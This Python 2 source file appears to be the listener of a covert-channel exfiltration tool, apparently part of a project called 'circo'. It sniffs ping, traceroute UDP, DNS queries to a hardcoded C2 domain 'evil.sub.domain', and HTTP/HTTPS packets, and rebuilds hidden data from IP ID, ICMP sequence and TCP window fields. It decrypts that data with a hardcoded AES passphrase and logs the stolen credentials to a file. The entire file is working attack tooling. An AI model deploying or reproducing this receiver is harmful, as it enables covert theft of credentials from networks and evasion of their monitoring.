#!/usr/bin/env python
# -*- coding: utf-8 -*-
from __future__ import print_function
import sys
import os
import re
import argparse
import time
import threading
import daemon
import pyaes
import pyscrypt
import collections
from scapy.all import Raw, IP, ICMP, TCP, UDP, DNS, sniff

# Me
__author__ = "Emilio / @ekio_jp"
__version__ = "1.4"

# Config
phrase = 'Waaaaa! awesome :)'
salt = 'salgruesa'
ccname = 'evil.sub.domain'
dirname = '/home/pi/circo/carpa/'
motd = dirname + 'motd'
DEBUG = False


# Classes
class PINGHandler(threading.Thread):
    """
    Class to observe PING packets
    and decrypt credentials
    """
    def __init__(self, iface, fd):
        threading.Thread.__init__(self)
        self.stoprequest = threading.Event()
        self.iface = iface
        self.fd = fd
	self.dic = {}
	self.pkttotal = 200
	self.pktlen = 0

    def pkt_callback(self, pkt):
	# Process PING packets
	if pkt[ICMP].type == 8:
	    if pkt[IP].id >= 200 and pkt[IP].id < 300:
		self.pktlen = pkt[IP].id - 200
	    elif pkt[IP].id >= 300 and pkt[IP].id < 400:
		self.pkttotal = pkt[IP].id - 300
	    elif pkt[IP].id >= 500 and pkt[IP].id < 600:
		self.dic[pkt[IP].id - 500] = '{:04x}'.format(pkt[ICMP].seq)

	    if len(self.dic) == self.pkttotal:
		odic = collections.OrderedDict(sorted(self.dic.items()))
		final = ''
		for k, v in odic.iteritems():
		    final = final + v
		text = decrypt(final[:self.pktlen])
		text = text.strip()
                hexip = text.split(',')[-1]
                srcip = hextoip(hexip)
                text = text.replace(hexip, hextoip(hexip))
		text = 'PING:' + pkt[IP].src + ':' + text
		if DEBUG:
		    print(time.strftime("%Y-%m-%d %H:%M:%S ",
			  time.gmtime()) + text)
		find = re.compile('\\b' + text + '\\b')
		with open(self.fd, 'a+') as sfile:
		    with open(self.fd, 'r') as xfile:
			m = find.findall(xfile.read())
			if not m:
			    sfile.write(time.strftime("%Y-%m-%d %H:%M:%S ",
					time.gmtime()) + text + '\n')
		self.dic = {}
		self.pkttotal = 200

    def run(self):
        while not self.stoprequest.isSet():
            sniff(iface=self.iface, prn=self.pkt_callback, filter="icmp",
                  store=0)

    def join(self):
        self.stoprequest.set()


class TraceHandler(threading.Thread):
    """
    Class to observe UDP packets (portrange 33434-33500)
    and decrypt credentials
    """
    def __init__(self, iface, fd):
        threading.Thread.__init__(self)
        self.stoprequest = threading.Event()
        self.iface = iface
        self.fd = fd
	self.dic = {}
	self.pkttotal = 200
	self.pktlen = 0

    def pkt_callback(self, pkt):
	if pkt[IP].id >= 200 and pkt[IP].id < 300:
	    self.pktlen = pkt[IP].id - 200
	elif pkt[IP].id >= 300 and pkt[IP].id < 400:
	    self.pkttotal = pkt[IP].id - 300
	elif pkt[IP].id >= 500 and pkt[IP].id < 600:
	    self.dic[pkt[IP].id - 500] = pkt[Raw].load[28:]

	if len(self.dic) == self.pkttotal:
	    odic = collections.OrderedDict(sorted(self.dic.items()))
	    final = ''
	    for k, v in odic.iteritems():
		final = final + v
	    text = decrypt(final[:self.pktlen])
	    text = text.strip()
            hexip = text.split(',')[-1]
            srcip = hextoip(hexip)
            text = text.replace(hexip, hextoip(hexip))
	    text = 'TRACE:' + pkt[IP].src + ':' + text
	    if DEBUG:
		print(time.strftime("%Y-%m-%d %H:%M:%S ",
		      time.gmtime()) + text)
	    find = re.compile('\\b' + text + '\\b')
	    with open(self.fd, 'a+') as sfile:
		with open(self.fd, 'r') as xfile:
		    m = find.findall(xfile.read())
		    if not m:
			sfile.write(time.strftime("%Y-%m-%d %H:%M:%S ",
				    time.gmtime()) + text + '\n')
	    self.dic = {}
	    self.pkttotal = 200

    def run(self):
        while not self.stoprequest.isSet():
	    sniff(iface=self.iface, prn=self.pkt_callback, store=0,
		  filter="(udp and dst portrange 33434-35000) and (not src port 53)")

    def join(self):
        self.stoprequest.set()


class DNSHandler(threading.Thread):
    """
    Class to observe DNS packets
    and decrypt credentials
    """
    def __init__(self, iface, fd, ccname):
        threading.Thread.__init__(self)
        self.stoprequest = threading.Event()
        self.iface = iface
        self.fd = fd
	self.ccname = ccname

    def pkt_callback(self, pkt):
	# Proccess DNS packets
	if self.ccname in pkt[DNS].qd.qname:
	    text = decrypt(pkt[DNS].qd.qname.split('.')[0])
	    text = text.strip()
            hexip = text.split(',')[-1]
            srcip = hextoip(hexip)
            text = text.replace(hexip, hextoip(hexip))
	    if pkt[DNS].qd.qtype == 2:
                text = 'DNS:' + pkt[IP].src + ':' + text
	    else:
                text = 'PDNS:' + pkt[IP].src + ':' + text
	    if DEBUG:
		print(time.strftime("%Y-%m-%d %H:%M:%S ",
		      time.gmtime()) + text)
	    find = re.compile('\\b' + text + '\\b')
	    with open(self.fd, 'a+') as sfile:
		with open(self.fd, 'r') as xfile:
		    m = find.findall(xfile.read())
		    if not m:
			sfile.write(time.strftime("%Y-%m-%d %H:%M:%S ",
				    time.gmtime()) + text + '\n')

    def run(self):
        while not self.stoprequest.isSet():
	    sniff(iface=self.iface, prn=self.pkt_callback, store=0,
		  filter="udp and dst port 53")

    def join(self):
        self.stoprequest.set()


class HTTPHandler(threading.Thread):
    """
    Class to observe HTTP packets (TCP port 80)
    and decrypt credentials
    """
    def __init__(self, iface, fd):
        threading.Thread.__init__(self)
        self.stoprequest = threading.Event()
        self.iface = iface
        self.fd = fd
	self.dic = {}
	self.pkttotal = 200
	self.pktlen = 0

    def pkt_callback(self, pkt):
	# Proccess HTTP packets (direct)
	if pkt[IP].id >= 200 and pkt[IP].id < 300:
	    self.pktlen = pkt[IP].id - 200
	elif pkt[IP].id >= 300 and pkt[IP].id < 400:
	    self.pkttotal = pkt[IP].id - 300
	elif pkt[IP].id >= 500 and pkt[IP].id < 600:
	    self.dic[pkt[IP].id - 500] = '{:04x}'.format(pkt[TCP].window)

	if len(self.dic) == self.pkttotal:
	    odic = collections.OrderedDict(sorted(self.dic.items()))
	    final = ''
	    for k, v in odic.iteritems():
		final = final + v
	    text = decrypt(final[:self.pktlen])
	    text = text.strip()
            hexip = text.split(',')[-1]
            srcip = hextoip(hexip)
            text = text.replace(hexip, hextoip(hexip))
	    text = 'HTTP:' + pkt[IP].src + ':' + text
	    if DEBUG:
		print(time.strftime("%Y-%m-%d %H:%M:%S ",
		      time.gmtime()) + text)
	    find = re.compile('\\b' + text + '\\b')
	    with open(self.fd, 'a+') as sfile:
		with open(self.fd, 'r') as xfile:
		    m = find.findall(xfile.read())
		    if not m:
			sfile.write(time.strftime("%Y-%m-%d %H:%M:%S ",
				    time.gmtime()) + text + '\n')
	    self.dic = {}
	    self.pkttotal = 200

    def run(self):
        while not self.stoprequest.isSet():
	    sniff(iface=self.iface, prn=self.pkt_callback, store=0,
		  filter="tcp and dst port 80")

    def join(self):
        self.stoprequest.set()


class HTTPSHandler(threading.Thread):
    """
    Class to observe HTTPS packets (TCP port 443)
    and decrypt credentials
    """
    def __init__(self, iface, fd):
        threading.Thread.__init__(self)
        self.stoprequest = threading.Event()
        self.iface = iface
        self.fd = fd
	self.dic = {}
	self.pkttotal = 200
	self.pktlen = 0

    def pkt_callback(self, pkt):
	# Proccess HTTPS packets
        if pkt[IP].id >= 200 and pkt[IP].id < 300:
            self.pktlen = pkt[IP].id - 200
        elif pkt[IP].id >= 300 and pkt[IP].id < 400:
            self.pkttotal = pkt[IP].id - 300
        elif pkt[IP].id >= 500 and pkt[IP].id < 600:
            self.dic[pkt[IP].id - 500] = '{:04x}'.format(pkt[TCP].window)

        if len(self.dic) == self.pkttotal:
            odic = collections.OrderedDict(sorted(self.dic.items()))
            final = ''
            for k, v in odic.iteritems():
                final = final + v
            text = decrypt(final[:self.pktlen])
            text = text.strip()
            hexip = text.split(',')[-1]
            srcip = hextoip(hexip)
            text = text.replace(hexip, hextoip(hexip))
	    text = 'HTTPS:' + pkt[IP].src + ':' + text
            if DEBUG:
                print(time.strftime("%Y-%m-%d %H:%M:%S ",
                      time.gmtime()) + text)
            find = re.compile('\\b' + text + '\\b')
            with open(self.fd, 'a+') as sfile:
                with open(self.fd, 'r') as xfile:
                    m = find.findall(xfile.read())
                    if not m:
                        sfile.write(time.strftime("%Y-%m-%d %H:%M:%S ",
                                    time.gmtime()) + text + '\n')
            self.dic = {}
            self.pkttotal = 200

    def run(self):
        while not self.stoprequest.isSet():
	    sniff(iface=self.iface, prn=self.pkt_callback, store=0,
		  filter="tcp and dst port 443")

    def join(self):
        self.stoprequest.set()


# Define Funtions
def decrypt(ciphertxt):
    hashed = pyscrypt.hash(phrase, salt, 1024, 1, 1, 16)
    key = hashed.encode('hex')
    aes = pyaes.AESModeOfOperationCTR(key)
    cleartxt = aes.decrypt(ciphertxt.decode('hex'))
    return cleartxt

def hextoip(ip):
    n = 2
    return '.'.join([str(int(ip[i:i+n], 16)) for i in range(0, len(ip), n)])

def parsingopt():
    parser = argparse.ArgumentParser()
    parser.add_argument('-v', '--verbose',
                        action='store_true', help='Enable Debugging')
    parser.add_argument('-i', required=True,
                        metavar='<eth0>', dest='nic', help='Sniff Interface')
    parser.add_argument('-f', required=True,
                        metavar='<file>', dest='fd', help='Output File')
    if len(sys.argv) > 1:
        try:
            return parser.parse_args()
        except IOError, msg:
            parser.error(str(msg))
    else:
        with open(motd, 'r') as sfile:
            print(sfile.read())
        print('Author: ' + __author__)
        print('Version: ' + __version__ + '\n')
        parser.print_help()
        sys.exit(1)

# Main Function

def main():
    global DEBUG
    options = parsingopt()
    if options.verbose:
        DEBUG = True

    if DEBUG:
        print('Listening.....')

    # PING Thread
    pingdh = PINGHandler(options.nic, options.fd)
    pingdh.daemon = True
    pingdh.start()

    # Traceroute Thread
    tracedh = TraceHandler(options.nic, options.fd)
    tracedh.daemon = True
    tracedh.start()

    # DNS Thread
    dnsdh = DNSHandler(options.nic, options.fd, ccname)
    dnsdh.daemon = True
    dnsdh.start()

    # HTTP Thread (direct or via proxy)
    httpdh = HTTPHandler(options.nic, options.fd)
    httpdh.daemon = True
    httpdh.start()

    # HTTPS Thread
    httpsdh = HTTPSHandler(options.nic, options.fd)
    httpsdh.daemon = True
    httpsdh.start()

    # Running loop 
    try:
        while True:
            pass
    except KeyboardInterrupt:
        sys.exit(0)

# Call main
if __name__ == '__main__':
    main()
